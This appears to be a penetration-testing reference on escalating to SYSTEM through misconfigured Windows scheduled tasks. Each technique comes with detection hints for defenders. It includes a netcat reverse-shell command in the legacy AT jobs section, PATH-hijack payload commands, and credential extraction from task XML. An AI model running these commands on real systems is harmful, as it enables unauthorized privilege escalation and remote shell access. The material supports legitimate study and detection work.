phase.title: Scheduled Tasks
phase.summary: Hunt for SYSTEM-run scheduled tasks whose script, binary, or task XML you can modify.

nodes.title: Enumerate scheduled tasks
nodes.summary: List every task, its trigger, and its run-as account.
nodes.description_md: Filter for non-Microsoft author and SYSTEM run-as to surface admin-set custom tasks.

snippets.title: Get-ScheduledTask
snippets.code: Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq 'SYSTEM' } | Select TaskName, TaskPath, Actions

nodes.title: Writable script invoked by SYSTEM task
nodes.summary: Tasks that call a .ps1 / .bat / .vbs in a writable directory are an easy SYSTEM win.

snippets.title: Check task action paths
snippets.code: schtasks /query /fo LIST /v | findstr /i "task to run" | findstr /i ".bat .ps1 .vbs .cmd"

nodes.description_md:
Scheduled tasks running as SYSTEM that invoke a script file (`.ps1`, `.bat`, `.vbs`, `.cmd`) in a user-writable directory are among the most reliable OSCP findings. Since scripts are plain text, no binary compilation is required — append code, wait for the trigger.

**Discovery workflow**:
1. `schtasks /query /fo LIST /v | findstr /i "Task To Run Run As"` — list task actions and accounts
2. Filter for SYSTEM-run tasks with script extensions in the action path
3. `icacls "<script_path>"` — verify writability
4. Append your payload (or overwrite entirely)
5. Wait for the next scheduled trigger, or `schtasks /run /tn "<taskname>"` if allowed

**Safe payload addition**: Append to the script (don't wipe it) to avoid breaking the task's intended function and alerting sysadmins. Use `Add-Content` / `echo ... >> file` rather than `Set-Content` / `echo ... > file`.
nodes.detection_hints: Writes to script files referenced by SYSTEM scheduled tasks; Task Scheduler executing scripts modified outside of maintenance windows; file integrity monitoring alerts on task script directories.

nodes.title: Writable binary invoked by SYSTEM task
nodes.summary: Same as above but for .exe — overwrite, wait for trigger or force a run.
nodes.description_md:
When a scheduled task runs an executable (`.exe`) as SYSTEM and that binary is in a world-writable or user-writable directory, overwriting it with a payload provides code execution in the SYSTEM context on the next task trigger.

**Compared to task-modifiable-script**: Binary replacement is more reliable (no interpreter or syntax issues) but noisier (file hash changes trigger FIM). Binary modifications also typically require stopping any running instances first.

**Forcing execution**: If you have permission to manually trigger the task (`schtasks /run`), you don't need to wait for the schedule. If the task only runs as SYSTEM on a time-based trigger, either wait or try to manipulate the system clock (last resort).

**Backup advice**: In exam/lab scenarios, always back up the original binary before replacement.
nodes.detection_hints: Binary hash changes on task action executables; process creation from task-associated paths with unexpected parent (svchost.exe / taskeng.exe); EID 4688 for unexpected executables.

nodes.title: Modifiable task XML in C:\Windows\System32\Tasks
nodes.summary: Direct XML write lets you alter the run-as principal or command line.
nodes.description_md:
Scheduled task definitions are stored as XML files under `C:\Windows\System32\Tasks\` with a corresponding registry cache. If the XML file itself has a weak ACL granting write access to non-admin users, the attacker can directly modify the task definition — changing the action binary, adding arguments, or changing the run-as principal.

**What to modify in the XML**:
- `<Exec><Command>` — the binary or script to run
- `<Arguments>` — command arguments
- `<Principal><UserId>` — the account (if you want to change execution context)
- `<Principal><RunLevel>` — set to `HighestAvailable` for elevated context

**Trigger**: After modifying the XML, use `schtasks /run /tn <name>` or wait for the scheduled time. Note that the Task Scheduler service reads configuration from the registry cache and may need to be refreshed.

**Accessing files**: Task XML files in `C:\Windows\System32\Tasks` require admin rights by default — a weak ACL here is a genuine misconfiguration.
nodes.detection_hints: Write events on files under `C:\Windows\System32\Tasks\`; Task Scheduler event 106 (task registered) or 200 (task started) for tasks with recently modified XML; EID 4657/Sysmon 13 on task registry cache.

nodes.title: Legacy AT jobs (Win7 / 2008)
nodes.summary: `at.exe` jobs on legacy boxes run as SYSTEM with no UAC.
nodes.description_md:
The legacy `at.exe` scheduler (pre-Windows Vista) creates jobs stored in `C:\Windows\System32\At<n>.job`. On Windows 7 and Server 2008/2008 R2, `at.exe` jobs run in the SYSTEM context without requiring UAC consent or admin rights for creation.

**Conditions**: This technique works on Windows 7 / Server 2008 R2 and older. It was patched/restricted in Windows 8 and later. The `Task Scheduler` service must be running.

**Key difference from schtasks**: `at.exe` does NOT require administrator rights to schedule jobs on the legacy Task Scheduler interface — any user can submit AT jobs on older systems.

**Usage**:
```cmd
at HH:MM "C:\Tools\nc.exe -e cmd.exe 10.10.14.5 4444"
```
Set the time to 1-2 minutes in the future, set up a listener, and receive a SYSTEM shell.

**Enumeration**: `at` (no arguments) lists all scheduled AT jobs.
nodes.detection_hints: at.exe execution from non-admin accounts; AT job file creation in System32; legacy scheduler events; absence of expected task in modern schtasks output (AT jobs don't show there).

nodes.title: Deep Task Enumeration via schtasks /query /v /fo LIST
nodes.summary: Extract detailed scheduled task configuration including run-as user, action path, trigger, and last run status using verbose schtasks output.
nodes.description_md:
The `schtasks /query /v /fo LIST` command reveals fields not visible in default output: Run As User, Task To Run (binary/script path), Status, Last Run Time, Next Run Time, and Schedule Type. This is the primary enumeration step before identifying writable task binaries or scripts.

Pipe through `findstr` to focus on high-value fields. PowerShell `Get-ScheduledTask` provides structured output for programmatic analysis.
nodes.detection_hints: Baseline task enumeration is low-signal. Alert on enumeration combined with subsequent writes to task binary/script paths or task XML modifications.

snippets.title: Verbose task listing focused on key fields
snippets.code:
schtasks /query /v /fo LIST 2>nul | findstr /I "TaskName Run As Task To Run Status Next Run"
schtasks /query /v /fo CSV | ConvertFrom-Csv | Select TaskName,"Run As User","Task To Run",Status | Format-Table
snippets.description: Enumerate all scheduled tasks with verbose detail and filter relevant fields.

snippets.title: PowerShell structured task enumeration
snippets.description: Enumerate all SYSTEM/admin tasks with their actions and last run result.

references.title: MITRE ATT&CK - Scheduled Task/Job: Scheduled Task

nodes.title: Task Action Pointing to Writable Script (Variant)
nodes.summary: Identify scheduled tasks that execute writable .ps1, .bat, .vbs, or .cmd scripts and modify script content to execute as the task's high-privilege account.
nodes.description_md:
Distinct from `task-modifiable-script`: focuses on script-type actions (not binary actions) and covers the full range of script interpreters invoked by tasks (PowerShell, cmd, wscript, cscript). Attacker appends or replaces script content.

Common pattern: `powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Maintenance.ps1` where `C:\Scripts\` is world-writable.
nodes.detection_hints: Monitor writes to script files referenced in task actions. Alert on Task Scheduler executing scripts modified outside of patch windows. File integrity monitoring on task script directories.

snippets.title: Find tasks with writable script actions
snippets.description: Enumerate tasks that run scripts via interpreters and check for writable script files.

snippets.title: Append reverse shell to writable task script
snippets.description: Append a PowerShell reverse shell to the writable task script.

references.title: MITRE ATT&CK - Scheduled Task/Job: Scheduled Task

nodes.title: Task Running as SYSTEM with Highest Privileges
nodes.summary: Identify tasks configured with RunLevel Highest and principal SYSTEM, confirming full privilege context for exploitation via writable action target.
nodes.description_md:
Tasks with `<RunLevel>HighestAvailable</RunLevel>` or `<Principal><UserId>S-1-5-18</UserId></Principal>` run with the SYSTEM token at maximum integrity. These are highest-value targets: successfully modifying their action binary or script results in a SYSTEM shell.

Use `schtasks /query /v` combined with `Get-ScheduledTask | Get-ScheduledTaskInfo` to correlate run level with executable paths.
nodes.detection_hints: Cross-reference SYSTEM tasks with filesystem ACLs on action targets. Any non-admin write to a SYSTEM task action target should be treated as critical.

snippets.title: Find SYSTEM tasks with highest run level
snippets.description: Identify all SYSTEM-context tasks and their action executables/scripts.

references.title: MITRE ATT&CK - Scheduled Task/Job: Scheduled Task

nodes.title: Environment Variable Injection in Task Action
nodes.summary: Exploit scheduled task actions that reference environment variables (e.g., %APPDATA%, %PATH%) which can be manipulated in the user's environment context to redirect execution.
nodes.description_md:
Some tasks use environment variables in their action path: `%APPDATA%\Company\update.exe` or resolve executables from `%PATH%`. If the attacker controls the relevant environment variable (e.g., per-user `PATH` entries in `HKCU\Environment`) or can write to a directory earlier in `%PATH%`, execution is redirected.

Particularly effective for tasks that run under the current user's context with elevated rights (UAC auto-elevate tasks).
nodes.detection_hints: Monitor `HKCU\Environment` modifications, especially changes to PATH or custom variables. Alert on process creation where the executable path resolves to a user-writable directory.

snippets.title: Find tasks using environment variables in actions
snippets.description: Identify task actions referencing environment variables.

snippets.title: Manipulate per-user PATH to hijack resolution
snippets.code:
reg add "HKCU\Environment" /v PATH /t REG_EXPAND_SZ /d "C:\Temp;%PATH%" /f
rem Place payload at C:\Temp\<taskbinary>.exe
copy C:\Temp\payload.exe C:\Temp\update.exe
snippets.description: Prepend attacker-controlled directory to per-user PATH, then place payload matching the task's executable name.

references.title: MITRE ATT&CK - Path Interception by PATH Environment Variable

nodes.title: COM Handler Task Abuse
nodes.summary: Hijack a COM object referenced by a scheduled task's COM handler action by planting a malicious COM server in HKCU, which takes precedence over HKLM registrations.
nodes.description_md:
Some scheduled tasks use a `ComHandler` action instead of an executable, specifying a CLSID. Windows resolves COM objects by checking `HKCU\Software\Classes\CLSID\` before `HKLM`. A low-privilege user can register a malicious in-process or out-of-process COM server under HKCU to intercept the task's COM activation.

Identify COM handler tasks by parsing task XML: look for `<ComHandler>` elements. Research the CLSID in both hives to find unregistered or HKCU-overridable entries.
nodes.detection_hints: Monitor HKCU COM registration (CLSID keys) for CLSIDs used by system tasks. Alert on DLL loads from user-writable paths within SYSTEM-context task processes.

snippets.title: Extract COM handler CLSIDs from task XML
snippets.description: Parse task XML files to find COM handler actions and extract their CLSIDs.

snippets.title: Register hijack COM server in HKCU
snippets.description: Register a malicious DLL as the COM server for the target CLSID under HKCU.

references.title: MITRE ATT&CK - Event Triggered Execution: Component Object Model Hijacking

nodes.title: Ghost Task / Task Scheduler Registry Abuse
nodes.summary: Create a 'ghost' scheduled task by writing directly to the Task Scheduler registry hive and task cache, bypassing the normal task registration process to hide from standard enumeration.
nodes.description_md:
The Task Scheduler maintains task metadata in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks` and `Tree`. By writing directly to these registry locations (requires admin or SeBackupPrivilege) and dropping a corresponding XML file in `C:\Windows\System32\Tasks`, an attacker can create tasks invisible to `schtasks /query` but executed by the scheduler.

Used for persistence that survives standard enumeration. Requires crafted security descriptors to avoid visibility.
nodes.detection_hints: Compare `schtasks /query` output against filesystem enumeration of `C:\Windows\System32\Tasks` and registry keys under `TaskCache\Tree`. Discrepancies indicate ghost tasks. Monitor direct registry writes to TaskCache.

snippets.title: Detect ghost tasks (discrepancy check)
snippets.code:
$schedulerTasks = (schtasks /query /fo CSV /nh 2>$null | ConvertFrom-Csv -Header TaskName,NextRun,Status).TaskName
$fsTasks = Get-ChildItem 'C:\Windows\System32\Tasks' -Recurse -File | Select-Object -ExpandProperty Name
$ghostCandidates = $fsTasks | Where-Object { $schedulerTasks -notcontains $_ }
Write-Output "Potential ghost tasks: $($ghostCandidates -join ', ')"
snippets.description: Identify ghost tasks by comparing schtasks output against the filesystem task store.

references.title: MITRE ATT&CK - Scheduled Task/Job: Scheduled Task

nodes.title: Export Task XML to Extract Credentials
nodes.summary: Export scheduled task definitions to XML using schtasks /query /xml or reading task files directly to recover plaintext or encoded credentials stored in task author/run-as fields.
nodes.description_md:
Tasks created with stored credentials (e.g., `schtasks /create /ru domain\user /rp password`) embed those credentials in the task XML or the Task Scheduler credential store (LSA secrets / TaskCache). The XML representation via `schtasks /query /xml` may expose `<Author>` fields or argument strings containing credentials.

Additionally, tasks configured with `/rp *` prompt for creds that are stored in LSA. These can be extracted with tools like Mimikatz (`sekurlsa::logonpasswords`) if the task was recently run.
nodes.detection_hints: Alert on bulk task XML exports by non-admin accounts. Monitor access to task files in `C:\Windows\System32\Tasks` by non-system processes.

snippets.title: Export all task XML and grep for credentials
snippets.description: Export all task XML definitions and search for credential-related strings.

snippets.title: Read task XML files directly from filesystem
snippets.description: Search task XML files on disk for credential-related content.
